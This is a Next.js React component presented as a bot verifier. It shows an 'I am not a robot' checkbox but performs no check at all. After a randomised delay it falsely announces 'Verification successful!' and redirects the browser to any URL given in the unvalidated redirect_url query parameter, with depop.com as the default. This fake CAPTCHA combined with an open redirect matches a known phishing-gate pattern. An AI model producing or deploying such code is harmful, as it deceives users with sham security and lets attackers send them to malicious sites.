"use client";

import { useState, useEffect } from 'react';
import { useSearchParams } from 'next/navigation';
import { Button } from '@/components/ui/button';
import { Checkbox } from '@/components/ui/checkbox';
import { Loader2 } from 'lucide-react';
import { Dialog, DialogContent } from '@/components/ui/dialog';
import { cn } from '@/lib/utils';

export default function BotVerifier() {
    const searchParams = useSearchParams();
    const redirectUrl = searchParams.get('redirect_url') || 'https://depop.com';

    const [isMounted, setIsMounted] = useState(false);
    const [isChecked, setIsChecked] = useState(false);
    const [isVerifying, setIsVerifying] = useState(false);
    const [countdown, setCountdown] = useState(5);
    const [isRedirecting, setIsRedirecting] = useState(false);

    useEffect(() => {
        setIsMounted(true);
    }, []);

    useEffect(() => {
        let timer: NodeJS.Timeout;
        if (isVerifying) {
            const randomExtraTime = Math.random() * 2000;
            const totalRedirectTime = 5000 + randomExtraTime;

            const countdownInterval = setInterval(() => {
                setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
            }, 1000);

            timer = setTimeout(() => {
                setIsRedirecting(true);
                window.location.href = redirectUrl;
            }, totalRedirectTime);

            return () => {
                clearTimeout(timer);
                clearInterval(countdownInterval);
            };
        }
    }, [isVerifying, redirectUrl]);

    const handleVerify = () => {
        if (isChecked) {
            setIsVerifying(true);
        }
    };
    
    if (!isMounted) {
        return null;
    }

    return (
        <Dialog open={!isVerifying}>
            <DialogContent className="sm:max-w-[425px] bg-background text-foreground rounded-lg shadow-2xl border-border p-8 text-center">
                <div className={cn("transition-opacity duration-500", isVerifying ? "opacity-0" : "opacity-100")}>
                    <h3 className="text-2xl font-bold mb-4">Verify your access</h3>
                    <p className="text-muted-foreground mb-6">Please confirm you are not a robot to continue.</p>
                    <div className="flex items-center justify-center space-x-2 my-6 p-4 bg-secondary rounded-md">
                        <Checkbox id="robot-check" checked={isChecked} onCheckedChange={(checked) => setIsChecked(!!checked)} className="h-6 w-6"/>
                        <label
                            htmlFor="robot-check"
                            className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                        >
                            I am not a robot
                        </label>
                    </div>
                    <Button onClick={handleVerify} disabled={!isChecked} className="w-full bg-accent text-accent-foreground hover:bg-accent/90" size="lg">
                        Verify
                    </Button>
                </div>
            </DialogContent>
            
            <Dialog open={isVerifying}>
                <DialogContent className="sm:max-w-[425px] bg-background text-foreground rounded-lg shadow-2xl border-border p-8 text-center flex flex-col items-center justify-center min-h-[300px]">
                    <div className={cn("flex flex-col items-center justify-center transition-opacity duration-500", isRedirecting ? "opacity-0" : "opacity-100")}>
                         <Loader2 className="h-16 w-16 animate-spin text-primary mb-6" />
                        <h3 className="text-2xl font-bold mb-2">Verification successful!</h3>
                        <p className="text-muted-foreground">Redirecting you in...</p>
                        <p className="text-6xl font-bold text-primary mt-4">{countdown}</p>
                    </div>
                </DialogContent>
            </Dialog>
        </Dialog>
    );
}
